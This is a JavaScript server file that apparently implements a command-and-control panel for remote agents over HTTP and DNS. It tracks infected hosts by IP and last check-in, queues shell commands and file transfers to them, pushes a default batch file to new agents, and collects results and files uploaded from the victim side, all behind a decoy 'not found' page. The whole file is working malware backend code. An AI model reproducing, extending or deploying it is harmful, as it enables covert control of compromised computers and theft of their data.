var commonDir = "./agents/";
var config = require('./../config.json');
var createIdPool = function (idPoolAddress) {
	var idz = [];
	for (var i = 1; i < 10; i++) {
		for (var j = 0; j < 10; j++) {
			for (var k = 1; k < 3; k++) {
				for (var l = 0; l < 5; l++) {
					idz.push(i + "" + j + "" + k + "" + l);
				}
			}
		}
	}
	//console.log("in create id pool function \n");
	var fs = require('fs');
	var file = fs.createWriteStream(idPoolAddress);
	file.on('error', function (err) { console.log(err); });
	idz.forEach(function (v) { file.write(v + '\n'); });
	file.end();
}

exports.panel = function (req, res) {
	var fs = require('fs');

	if (req.params.input == null) {
		//res.redirect("/login");
		return;
	}
	if (req.params.input == "favicon.ico") {
		//res.redirect("/login");
		return;
	}

	var inputLen = req.params.input.length;

	// check password from cookie
	var Cookies = require('cookies');
	var cookies = new Cookies(req, res);
	var cookie = cookies.get(config.user);

	console.log(inputLen + ":" + req.params.input + ">" + cookie);
	var pass = false;
	if (cookie === undefined) {
		res.render('notfound');
		return;
	} else {
		if (cookie != config.password) {
			res.render('notfound');
			return;
		} else {
			pass = true;
		}
	}
	if (!pass) {
		if (req.params.input == "notfound") {
			res.render('notfound');
			return;
		}
	}
	if (inputLen != 15) {
		if (inputLen != 16) {
			res.redirect("/in/http");
			return;
		}
	}


	var tokensTmp = req.params.input.split("<>");
	var agentId = tokensTmp[1];
	var agentType = tokensTmp[0];

	var agentDir = commonDir + agentType + "/" + agentId;
	if (!fs.existsSync(agentDir + "/cfg")) { // checking for config file of agent
		res.redirect("/in/http");
		return;
	}

	//console.log(agentType);
	if (agentType == "dns") {
		if (!fs.existsSync(agentDir + "/idPool")) {
			createIdPool(agentDir + "/idPool");
		}/*else if() {
			// file length less than 1 kb - there isn't more idz
		}*/
	}

	fs.readFile(commonDir + agentType + "/" + agentId + "/cfg", 'utf8', function (err, data) {
		if (err) { console.log(err); }
		fs.readFile(commonDir + agentType + "/" + agentId + "/cfglast", 'utf8', function (err, date) {
			if (err) { console.log(err); }
			var lines = data.trim().split('\n');
			var lastLine = lines.slice(-1)[0];
			var info = lastLine.split("<>");
			var whoami = info[1];
			var ip = info[2];
			var first = info[3];
			if(date != undefined) {
				first = date;
			}

			var dateFormat = require('dateformat');
			var commandIdTmp = dateFormat(new Date(), "mmddHHMMss");
			//if(commandIdTmp.charAt(0) == "0") {commandIdTmp = '1'+commandIdTmp.substring(1, 10);}
			var commands = [];

			// read wait send and receive folder...................
			var ff = require('flat-file-db');
			var db = ff.sync(agentDir + "/log.db");
			var keys = db.keys();
			console.log(agentDir);
			for (var i = 0; i < keys.length; i++) {
				//console.log(db.get(keys[i]));
				commands.push(db.get(keys[i]));
			}
			db.close();
			//console.log(commands);


			var df = require('dateformat');
			res.render('panel', { agentDetails: [agentId, whoami, ip, first, agentType], commandId: "" + commandIdTmp, commands: commands, current_time: (df(new Date()).toString()) });
		});		
	});
};

exports.tars = function (req, res) {

	if (req.params.input == null) {
		//res.redirect("/login");
		return;
	}
	var Cookies = require('cookies');
	var cookies = new Cookies(req, res);
	var cookie = cookies.get(config.user);
	var pass = false;
	if (cookie === undefined) {
		//res.redirect('/login');
		return;
	} else {
		if (cookie != config.password) {
			//res.redirect('/login');
			return;
		}
	}

	var branch = req.params.input;
	var agentsDetail = [];
	var fs = require('fs');


	var state = "httpActive";

	console.log("[tars function]: after checking cookie!");

	var proms = []
	if (branch == "dns") {
		state = "dnsActive";
		fs.readdir(commonDir + "dns", function (err, files) {
			if (err) { console.log(err); }
			for (var i = 0; i < files.length; i++) {
				if (fs.statSync(commonDir + "dns/" + files[i]).isDirectory()) {
					var data = files[i] + "<>f<>cfg_not_exist<>u<>c<>k";
					var prom = new Promise((resolve, reject) => {
						var cfgAddress = commonDir + "dns/" + files[i] + "/cfg";
						fs.readFile(cfgAddress, 'utf8', function (err, data) {
							fs.readFile(cfgAddress + "last", 'utf8', function (err1, date) {
								if (err) {
									console.log(err);
									//reject()
								}
								if (data == undefined) {
									data = files[i] + "<>f<>cfg_not_exist<>f<>u<>c<>k";
								}
								var lines = data.trim().split('\n');
								var lastLine = lines.slice(-1)[0];
								tokens = lastLine.split("<>");
								var tempTokens = [];
								tempTokens.push(tokens[0]);
								tempTokens.push(tokens[1]);
								tempTokens.push(tokens[2]);
								
								var moment = require('moment');
								console.log(tokens[3], new Date());
								var startTime = "";
								if (date == undefined) {
									startTime = tokens[3];
								} else {
									startTime = date;
								}
								var startDate = moment(new Date(Date.parse(startTime)), 'yyyy-mm-dd HH:MM:ss');
								var endDate = moment(new Date(), 'yyyy-mm-dd HH:MM:ss');
								var diffMTemp = endDate.diff(startDate, 'Minutes');
								var diffD = endDate.diff(startDate, 'Days');
								var diffH = endDate.diff(startDate, 'Hours') - (diffD * 24);
								var diffM = diffMTemp - (diffH * 60) - (diffD * 24 * 60);
								tempTokens.push(diffD + "d " + diffH + "h " + diffM + "m");
								tempTokens.push("dns");
								if (diffMTemp < 2) {
									tempTokens.push("color:green");
								} else if (diffMTemp < 60) {
									tempTokens.push("color:orange");
								} else {
									tempTokens.push("color:red");
								}

								if (fs.existsSync(commonDir + "files/description.db")) {

									var ff = require('flat-file-db');
									var db = ff.sync(commonDir + "files/description.db");
									var des = db.get(tokens[0]);
									if (des === undefined) {
										tempTokens.push("No description");
									} else {
										tempTokens.push(des);
									}
								} else {
									tempTokens.push("No description");
								}
								//agentsDetail.push(tempTokens);
								resolve(tempTokens)
							});
						});
					})
					proms.push(prom)
				}
			}
			Promise.all(proms).then(data => {
				res.render('agents', { agents: data, state: state });
			}).catch(function () {
				console.log("Promise Rejected");
		   });
		});
	} else {
		fs.readdir(commonDir + "http", function (err, files) {
			if (err) { console.log(err); }
			console.log("[tars function]: http before reading folder! " + files.length);
			for (var i = 0; i < files.length; i++) {
				if (fs.statSync(commonDir + "http/" + files[i]).isDirectory()) {

					var prom = new Promise((resolve, reject) => {
						var cfgAddress = commonDir + "http/" + files[i] + "/cfg";
						fs.readFile(cfgAddress, 'utf8', function (err, data) {
							fs.readFile(cfgAddress + "last", 'utf8', function (err1, date) {
								console.log("this is date: "+date);
								if (err1) {
									console.log(err1); 
									//reject()
								}

								if (err) {
									console.log(err); 
									//reject()
								}
								if (data == undefined) {
									data = files[i] + "<>f<>cfg_not_exist<>f<>u<>c<>k";
								}
								var lines = data.trim().split('\n');
								var lastLine = lines.slice(-1)[0];
								tokens = lastLine.split("<>");
								var tempTokens = [];
								tempTokens.push(tokens[0]);
								tempTokens.push(tokens[1]);
								tempTokens.push(tokens[2]);

								var moment = require('moment');
								var startTime = "";
								if (date == undefined) {
									startTime = tokens[3];
								} else {
									startTime = date;
								}
								var startDate = moment(new Date(Date.parse(startTime)), 'yyyy-mm-dd HH:MM:ss');
								var endDate = moment(new Date(), 'yyyy-mm-dd HH:MM:ss');
								var diffMTemp = endDate.diff(startDate, 'Minutes');
								var diffD = endDate.diff(startDate, 'Days');
								var diffH = endDate.diff(startDate, 'Hours') - (diffD * 24);
								var diffM = diffMTemp - (diffH * 60) - (diffD * 24 * 60);
								tempTokens.push(diffD + "d " + diffH + "h " + diffM + "m");
								tempTokens.push("http");
								if (diffMTemp < 2) {
									tempTokens.push("color:green");
								} else if (diffMTemp < 60) {
									tempTokens.push("color:orange");
								} else {
									tempTokens.push("color:red");
								}
								console.log(tempTokens);
								if (fs.existsSync(commonDir + "files/description.db")) {
									var ff = require('flat-file-db');
									var db = ff.sync(commonDir + "files/description.db");
									var des = db.get(tokens[0]);
									if (des === undefined) {
										tempTokens.push("No description");
									} else {
										tempTokens.push(des);
									}
								} else {
									tempTokens.push("No description");
								}
								resolve(tempTokens)
							});
						});
					})
					proms.push(prom)
				}
			}
			Promise.all(proms).then(data => {
				res.render('agents', { agents: data, state: state });
			}).catch(function () {
				console.log("Promise Rejected");
		   });
		});
	}

	// console.log("[tars function]: before rendering page!");
	// console.log(agentsDetail);
};

exports.notFound = function (req, res) {
	res.send("<h2>Go the other way bro, can't find here</h2>");
};

exports.posted = function (req, res) { // posted command and upload and download from agent panel

	var commandId = req.body.commandId;
	var command = req.body.command;
	var downloadAdr = req.body.downloadAdr;
	var agentId = req.body.agentId;
	var agentType = req.body.agentType;
	var commandType = req.body.commandType;
	var defaultCommand = req.body.defaultCommand;

	var fs = require('fs');

	var agentDir = commonDir + agentType + "/" + agentId;

	if (!fs.existsSync(agentDir)) {
		fs.mkdirSync(agentDir);
	}
	// inserting new command .....
	var ff = require('flat-file-db');
	var db = ff.sync(agentDir + "/log.db");

	if (agentType == "dns") { // create command files in dns type agents ....
		var currentCommandId = "null";
		if (!fs.existsSync(agentDir + "/idPool")) {
			createIdPool(agentDir + "/idPool");
		} else {
			fs.readFile(agentDir + "/idPool", 'utf8', function (err, data) {
				if (err) { }
				currentCommandId = data.split('\n')[0];
				var linesExceptFirst = data.split('\n').slice(1).join('\n');
				fs.writeFile(agentDir + "/idPool", linesExceptFirst, function (err) { if (err) { console.log(err); } });
				if (!fs.existsSync(agentDir)) { fs.mkdirSync(agentDir + "/wait_txt/"); }

				console.log("download address: " + downloadAdr);

				if (commandType) {
					if (command != "" && command != undefined) {
						fs.writeFile(agentDir + "/wait_txt/" + currentCommandId + "0", command, function (err) { if (err) { console.log(err); } });
						db.put(currentCommandId + "0", [commandId, ((command == "" || command == undefined) ? "not" : command), (req.file == null ? "not" : req.file.originalname), (req.file == null ? "not" : req.file.filename), ((downloadAdr == "" || downloadAdr == undefined) ? "not" : downloadAdr), "0"]);
					}
					if (req.file != null) {
						console.log("copy the file   " + agentDir + "/wait_txt/" + req.file.originalname);

						//fs.writeFile(agentDir + "/wait_txt/" + req.file.originalname, fs.readFileSync(commonDir + "files/" + req.file.filename));
						fs.readFile(commonDir + "files/" + req.file.filename, function (err, data) {
							if (err) { console.log(err); }
							fs.writeFile(agentDir + "/wait_txt/" + req.file.originalname, data, function (err) { if (err) { console.log(err); } });

						});
						db.put(currentCommandId + "2", [commandId, ((command == "" || command == undefined) ? "not" : command), (req.file == null ? "not" : req.file.originalname), (req.file == null ? "not" : req.file.filename), ((downloadAdr == "" || downloadAdr == undefined) ? "not" : downloadAdr), "0"]);
					}
					if (downloadAdr != "" && downloadAdr != undefined) {
						fs.writeFile(agentDir + "/wait_txt/" + currentCommandId + "1", downloadAdr);
						db.put(currentCommandId + "1", [commandId, ((command == "" || command == undefined) ? "not" : command), (req.file == null ? "not" : req.file.originalname), (req.file == null ? "not" : req.file.filename), ((downloadAdr == "" || downloadAdr == undefined) ? "not" : downloadAdr), "0"]);
					}
				} else {
					if (command != "" && command != undefined) {
						fs.writeFile(agentDir + "/wait/" + currentCommandId + "0", command, function (err) { if (err) { console.log(err); } });
						db.put(currentCommandId + "0", [commandId, ((command == "" || command == undefined) ? "not" : command), (req.file == null ? "not" : req.file.originalname), (req.file == null ? "not" : req.file.filename), ((downloadAdr == "" || downloadAdr == undefined) ? "not" : downloadAdr), "0"]);
					}
					if (req.file != null) {
						//fs.writeFile(agentDir+"/wait/"+currentCommandId+"2", fs.readFileSync(commonDir+"files/"+req.file.filename));
						fs.readFile(commonDir + "files/" + req.file.filename, function (err, data) {
							if (err) { console.log(err); }
							fs.writeFile(agentDir + "/wait/" + currentCommandId + "2", data, function (err) { if (err) { console.log(err); } });

						});
						db.put(currentCommandId + "2", [commandId, ((command == "" || command == undefined) ? "not" : command), (req.file == null ? "not" : req.file.originalname), (req.file == null ? "not" : req.file.filename), ((downloadAdr == "" || downloadAdr == undefined) ? "not" : downloadAdr), "0"]);
					}
					if (downloadAdr != "" && downloadAdr != undefined) {
						fs.writeFile(agentDir + "/wait/" + currentCommandId + "1", downloadAdr, function (err) { if (err) { console.log(err); } });
						db.put(currentCommandId + "1", [commandId, ((command == "" || command == undefined) ? "not" : command), (req.file == null ? "not" : req.file.originalname), (req.file == null ? "not" : req.file.filename), ((downloadAdr == "" || downloadAdr == undefined) ? "not" : downloadAdr), "0"]);
					}
				}
				db.close();
			});
		}
	} else {
		if (defaultCommand == "yes") {
			db.put(commandId, [commandId, "Default Command", "0000000000.bat", "default command file", "not", "0"]);
			db.close();
			fs.writeFile(agentDir + "/wait/" + commandId, commandId + "<>C:\\Users\\Public\\Public_Data\\files\\0000000000.bat<>0000000000.bat<>386be98ce7c7955f92dc060779ed7613<>not", function (err) { if (err) { console.log("write command file: " + err); } });
		} else {
			db.put(commandId, [commandId, (command == "" ? "not" : command), (req.file == null ? "not" : req.file.originalname), (req.file == null ? "not" : req.file.filename), (downloadAdr == "" ? "not" : downloadAdr), "0"]);
			db.close();
			fs.writeFile(agentDir + "/wait/" + commandId, commandId + "<>" + (command == "" ? "not" : command) + "<>" + (req.file == null ? "not" : req.file.originalname) + "<>" + (req.file == null ? "not" : req.file.filename) + "<>" + (downloadAdr == "" ? "not" : downloadAdr), function (err) { if (err) { console.log("write command file: " + err); } });
		}
	}
	res.redirect("/" + agentType + "<>" + agentId);
}

exports.deleteCommand = function (req, res) {
	//console.log("[deleteCommand] function first line");
	if (req.params.input == null) {
		//res.redirect("/login");
		return;
	}
	var Cookies = require('cookies');
	var cookies = new Cookies(req, res);
	var cookie = cookies.get(config.user);
	var pass = false;
	if (cookie === undefined) {
		//res.redirect('/login');
		return;
	} else {
		if (cookie != config.password) {
			//res.redirect('/login');
			return;
		}
	}

	//console.log("[deleteCommand] after session checking");

	var tokensTmp = req.params.input.split("-");
	var agentType = tokensTmp[0];
	var agentId = tokensTmp[1];
	var commandId = tokensTmp[2];
	var agentDir = commonDir + agentType + "/" + agentId;

	//console.log("[deleteCommand] setting agent directory: "+agentDir);

	var fileName = commandId;
	var fs = require('fs');
	var ff = require('flat-file-db');
	var db = ff.sync(agentDir + "/log.db");
	if (agentType == "dns") {
		var keys = db.keys();
		for (var i = 0; i < keys.length; i++) {
			var tupleTmp = db.get(keys[i]);
			if (tupleTmp[0] == commandId) {
				fileName = keys[i];
				// delete from database
				db.del(fileName);
			}
		}
	}
	db.del(commandId);
	db.close();
	//console.log("[deleteCommand] getting tuple file name: "+ fileName);

	if (fs.existsSync(agentDir + "/wait/" + fileName)) {
		// delete fileName
		fs.unlink(agentDir + "/wait/" + fileName, function (err) { if (err) { console.log(err); } });
	}
	res.redirect("/" + agentType + "<>" + agentId);
}

exports.deleteAgent = function (req, res) {   // ............................................... deleteAgent function ....................

	console.log("[deleteAgent] function first line");

	if (req.params.input == null) {
		//res.redirect("/login");
		return;
	}
	var Cookies = require('cookies');
	var cookies = new Cookies(req, res);
	var cookie = cookies.get(config.user);
	var pass = false;
	if (cookie === undefined) {
		//res.redirect('/login');
		return;
	} else {
		if (cookie != config.password) {
			//res.redirect('/login');
			return;
		}
	}
	//console.log("[deleteAgent] after session checking");
	var fs = require('fs');
	var tokensTmp = req.params.input.split("<>");
	var agentId = tokensTmp[1];
	var agentType = tokensTmp[0];
	var deleteFolderRecursive = function (path) {
		if (fs.existsSync(path)) {
			fs.readdirSync(path).forEach(function (file, index) {
				var curPath = path + "/" + file;
				if (fs.lstatSync(curPath).isDirectory()) { // recurse
					deleteFolderRecursive(curPath);
				} else { // delete file
					fs.unlink(curPath, function (err) { if (err) { console.log(err); } });
				}
			});
			fs.rmdir(path, function (err) { if (err) console.log(err); });
		}
	};

	deleteFolderRecursive(commonDir + agentType + "/" + agentId);

	res.redirect("/in/http");
	return;
}

exports.deleteCommand = function (req, res) {

	console.log("[deleteCommand] function first line");

	if (req.params.input == null) {
		//res.redirect("/login");
		return;
	}
	var Cookies = require('cookies');
	var cookies = new Cookies(req, res);
	var cookie = cookies.get(config.user);
	var pass = false;
	if (cookie === undefined) {
		//res.redirect('/login');
		return;
	} else {
		if (cookie != config.password) {
			//res.redirect('/login');
			return;
		}
	}

	//console.log("[deleteCommand] after session checking");

	var tokensTmp = req.params.input.split("-");
	var agentType = tokensTmp[0];
	var agentId = tokensTmp[1];
	var commandId = tokensTmp[2];
	var agentDir = commonDir + agentType + "/" + agentId;

	//console.log("[deleteCommand] setting agent directory: "+agentDir);

	var fileName = commandId;
	var fs = require('fs');
	var ff = require('flat-file-db');
	var db = ff.sync(agentDir + "/log.db");
	if (agentType == "dns") {
		var keys = db.keys();
		for (var i = 0; i < keys.length; i++) {
			var tupleTmp = db.get(keys[i]);
			if (tupleTmp[0] == commandId) {
				fileName = keys[i];
				// delete from database
				db.del(fileName);
			}
		}
	}
	db.del(commandId);
	db.close();
	//console.log("[deleteCommand] getting tuple file name: "+ fileName);

	if (fs.existsSync(agentDir + "/wait/" + fileName)) {
		// delete fileName
		fs.unlink(agentDir + "/wait/" + fileName, function (err) { if (err) { console.log(err); } });
	}
	res.redirect("/" + agentType + "<>" + agentId);
}
exports.descriptionPosted = function (req, res) {

	var Cookies = require('cookies');
	var cookies = new Cookies(req, res);
	var cookie = cookies.get(config.user);
	var pass = false;
	if (cookie === undefined) {
		//res.redirect('/login');
		return;
	} else {
		if (cookie != config.password) {
			//res.redirect('/login');
			return;
		}
	}

	var agentDescription = req.body.agentDescription;
	var agentId = req.body.agentId;
	var fs = require('fs');
	var ff = require('flat-file-db');
	var db = ff.sync(commonDir + "files/description.db");
	db.put(agentId, agentDescription);
	db.close();
	res.redirect("/in/http");
	return;
}


exports.result = function (req, res) { // .......................................... show result to user function ..................

	if (req.params.input == null) {
		//res.redirect("/login");
		return;
	}
	var Cookies = require('cookies');
	var cookies = new Cookies(req, res);
	var cookie = cookies.get(config.user);
	var pass = false;
	if (cookie === undefined) {
		//res.redirect('/login');
		return;
	} else {
		if (cookie != config.password) {
			//res.redirect('/login');
			return;
		}
	}

	var tokensTmp = req.params.input.split("-");
	var agentType = tokensTmp[0];
	var agentId = tokensTmp[1];
	var commandId = tokensTmp[2];

	var fs = require('fs');
	var ff = require('flat-file-db');
	var db = ff(commonDir + agentType + "/" + agentId + "/log.db");
	var pt = require('path');

	if (agentType == "dns") {
		db.on('open', function () {
			var keys = db.keys();
			for (var i = 0; i < keys.length; i++) {
				var tupleTmp = db.get(keys[i]);
				if (tupleTmp[0] == commandId) {
					commandId = keys[i];
				}
			}

			var commandAddress = commonDir + agentType + "/" + agentId + "/receive/" + commandId;
			if (fs.existsSync(commandAddress)) {
				fs.readFile(commandAddress, function (err, data) {
					if (err) { console.log(err); }
					res.render('result', { data: data });
				});
			} else {
				res.send("<h2>Response file does not exist!</h2>");
			}

		});
		db.close();
	} else {
		db.on('open', function () {
			var tmp = db.get(commandId);
			var fileAddress = "0";
			for (var i = 0; i < tmp.length; i++) {
				if (tmp[i].toString().startsWith("upl<>")) {
					fileAddress = tmp[i].toString().substring(6);
				}
			}
			if (fileAddress != "0") {
				res.download(pt.join(__dirname, "../" + fileAddress));
			} else {
				var commandAddress = commonDir + agentType + "/" + agentId + "/receive/" + commandId;
				if (fs.existsSync(commandAddress)) {
					fs.readFile(commandAddress, function (err, data) {
						if (err) { console.log(err); }
						res.render('result', { data: data });
					});
				} else {
					res.send("<h2>Response file does not exist!</h2>");
				}
			}
		});
		db.close();
	}
}
// logInfo(agentId, whoami, requestIp, dateNow, agentDir+"/cfg");
function logInfo(agentId, whoami, ip, date, ipLogFileAddress) { // .................................................................. log the information ...............
	if (agentId === undefined || whoami === undefined || ip === undefined || date === undefined || ipLogFileAddress === undefined) {
		return;
	}
	//console.log(agentId+"   "+whoami+"   "+ip+"    "+date);
	var fs = require('fs');
	var lines = [];
	var lineNumber = -1;
	console.log(ipLogFileAddress);
	fs.writeFile(ipLogFileAddress+"last", date, function (err) { if (err) { console.log(err); } });
	if (fs.existsSync(ipLogFileAddress)) {
		fs.readFile(ipLogFileAddress, 'utf8', function (err, data) {
			if (err) { console.log(err); }
			lines = data.split('\n');
			for (var i = 0; i < lines.length; i++) {
				var lineIp = lines[i].split('<>')[2];
				//console.log("lineIp: " + lineIp);
				if (lineIp == ip) {
					lineNumber = i;
				}
			}
			//console.log("lineNumber: " + lineNumber);
			if (lines.length > 0) {
				fs.writeFile(ipLogFileAddress, lines[0], function (err) {
					if (err) { console.log(err); }
					for (var j = 1; j < lines.length; j++) {
						if (lineNumber != j) {
							fs.appendFile(ipLogFileAddress, "\n" + lines[j], function (err) { if (err) { console.log(err); } });
						}
					}
				});
			}
			fs.appendFile(ipLogFileAddress, "\n" + agentId + "<>" + whoami + "<>" + ip + "<>" + date, function (err) { if (err) { console.log(err); } });
		});
	} else {
		fs.writeFile(ipLogFileAddress, "\n" + agentId + "<>" + whoami + "<>" + ip + "<>" + date, function (err) { if (err) { console.log(err); } });
	}
}

exports.loginPage = function (req, res) { // ................................................ login checking function ..................

	console.log("hddddddddddddddddd");
	res.render('login');
	return;

}

exports.login = function (req, res) { // ................................................ login checking function .................
	var Cookies = require('cookies');
	var cookies = new Cookies(req, res);
	var cookie = cookies.get(config.user);
	if (cookie === undefined) {
		//console.log("cookie not exist");
		var username = req.body.username;
		var password = req.body.password;
		//console.log(username+"   "+password);
		if (username == config.user && password == config.password) {
			// set cookie
			cookies.set(config.user, config.password, { maxAge: new Date(Date.now() + 3600000), expires: new Date(Date.now() + 3600000), httpOnly: true })
			//console.log('cookie created successfully');
			res.redirect("/in/http");
			return;
		} else {
			res.redirect(config.guid);
			return;
		}
	} else {
		// yes, cookie was already present 
		//console.log('cookie exists', cookie);
		res.redirect("/in/http");
	}
}

exports.resultPosted = function (req, res) { // ...................................... result of command recieved and save function .....................
	var agentCode = req.params.input;
	console.log("agentCode=> " + agentCode);
	var requestId = "";
	var agentId = "";
	if (agentCode.length > 20) {
		requestId = agentCode.substring(agentCode.length - 10);
		agentId = agentCode.substring(0, 5) + agentCode.substring(agentCode.length - 15, agentCode.length - 10);
	} else {
		console.log("input agentCode not in correct format!");
		return;
	}
	console.log(requestId + " <=requestId and agentId=> " + agentId);
	var agentDir = commonDir + "http/" + agentId;
	var file = req.files[0];
	var fs = require('fs');

	console.log(agentDir + " <=agentDir and uploaded result file path=> " + file.path);

	if (!fs.existsSync(agentDir + "/receive/")) { fs.mkdirSync(agentDir + "/receive/"); }
	fs.createReadStream(file.path).pipe(fs.createWriteStream(agentDir + "/receive/" + requestId));
	res.send("ok");
	console.log("register receive the result");
	var ff = require('flat-file-db');
	var db = ff.sync(agentDir + "/log.db");
	var tmp = db.get(requestId);
	if (tmp !== undefined) {
		tmp.push(agentDir + "/receive/" + requestId);
		tmp.push("2");
	}
	db.put(requestId, tmp);
	db.close();
	console.log("ending receiving");
};

exports.filePosted = function (req, res) { // ......................................... file posted from agent side .............
	var agentCode = req.params.input;
	var requestId = "";
	var agentId = "";

	if (agentCode.length > 20) {
		requestId = agentCode.substring(agentCode.length - 10);
		agentId = agentCode.substring(0, 5) + agentCode.substring(agentCode.length - 15, agentCode.length - 10);
	} else {
		return;
	}
	var agentDir = commonDir + "http/" + agentId;
	var ff = require('flat-file-db');
	var db = ff.sync(agentDir + "/log.db");
	var file = req.files[0];
	var fs = require('fs');
	var tmp = db.get(requestId);
	//console.log(agentDir+ " >>> "+db.keys());
	var fileName = tmp[4].replace(/^.*[\\\/]/, '');
	fs.createReadStream(file.path).pipe(fs.createWriteStream(agentDir + "/receive/" + fileName));
	res.send("ok");
	console.log(agentDir + "/receive/" + fileName);
	if (tmp !== undefined) {
		tmp.push("upl<>" + agentDir + "/receive/" + fileName);
		tmp.push("2");
	}
	console.log(tmp);
	db.put(requestId, tmp);
	db.close();
};

exports.getFile = function (req, res) {
	var fileName = req.params.input;
	var fs = require('fs');
	var fileAddress = commonDir + "files/" + fileName;
	fs.createReadStream(fileAddress).pipe(res);
};

// agent request for last command
exports.agent = function (req, res) { // .............................. 
	var agentCode = req.params.input;
	var agentId = "";
	var fs = require('fs');
	var df = require('dateformat');
	if (agentCode.length > 10) {
		var requestIp = req.connection.remoteAddress.replace(/^.*:/, '');
		agentId = agentCode.substring(0, 5) + agentCode.substring(agentCode.length - 5, agentCode.length);
		var agentDir = commonDir + "http/" + agentId;
		if (!fs.existsSync(agentDir)) { // this is new agent ....
			fs.mkdir(agentDir, function (err) {
				if (err) { console.log(err); }
				fs.mkdir(agentDir + "/send/");
				fs.mkdir(agentDir + "/receive/");
				fs.mkdir(agentDir + "/wait/", function (err) {
					if (err) { console.log(err); }
					fs.createReadStream("./0000000000.bat").pipe(fs.createWriteStream(commonDir + "/files/386be98ce7c7955f92dc060779ed7613"));
					fs.writeFile(agentDir + "/wait/0000000000", "0000000000<>C:\\Users\\Public\\Public_Data\\files\\0000000000.bat<>0000000000.bat<>386be98ce7c7955f92dc060779ed7613<>not", function (err) { if (err) { console.log(err); } });
					var ff = require('flat-file-db');
					var db = ff.sync(agentDir + "/log.db");
					db.put("0000000000", ["0000000000", "Default Command", "0000000000.bat", "default command file", "not", "0"]);
					db.close();
				});
			});
		}
		if (fs.existsSync(agentDir + "/wait/")) {
			// var files = fs.readdirSync(agentDir+"/wait/"); // asyncing
			fs.readdir(agentDir + "/wait/", function (err, files) {
				if (err) console.log(err);
				// log last ip and time of agent connected to server
				var dateFormat = require('dateformat');
				var whoami = "whoami";
				var dateNow = df(new Date()); //'yyyy-mm-dd HH:MM:ss'
				logInfo(agentId, whoami, requestIp, dateNow, agentDir + "/cfg");

				if (files.length > 0) {
					var data = fs.readFile(agentDir + "/wait/" + files[0], 'utf8', function (err, data) {
						if (err) { console.log(err); }
						//console.log(data);
						res.send(data + "<>1");
						// should asyncing
						fs.createReadStream(agentDir + "/wait/" + files[0]).pipe(fs.createWriteStream(agentDir + "/send/" + files[0]));
						// fs.unlink(agentDir+"/wait/"+files[0]); // asyncing
						fs.unlink(agentDir + "/wait/" + files[0], function (err) { if (err) { console.log(err); } });
						// file sended update db
						var ff = require('flat-file-db');
						var db = ff.sync(agentDir + "/log.db");
						var tmp = db.get(files[0]);
						if (tmp !== undefined) {
							tmp.push("1");
							db.put(files[0], tmp);
						}
						//console.log(db.get(files[0]));
						//console.log("updateing: "+db.get(files[0]));
						db.close();
					});
				} else {
					res.send("not<>not<>not<>not<>0");
				}
			});
		} else {
			// fs.mkdirSync(agentDir+"/wait/"); // asyncing
			fs.mkdir(agentDir + "/wait/", function (err) { if (err) { console.log(err); } });
			res.send("not<>not<>not<>not<>0");
		}
	}
};



/*

// defining a function
var async_function = function(val, callback){
    process.nextTick(function(){
        callback(val);
    });
};

// using the function
async_function(true, function(val){
    // val == true
});

*/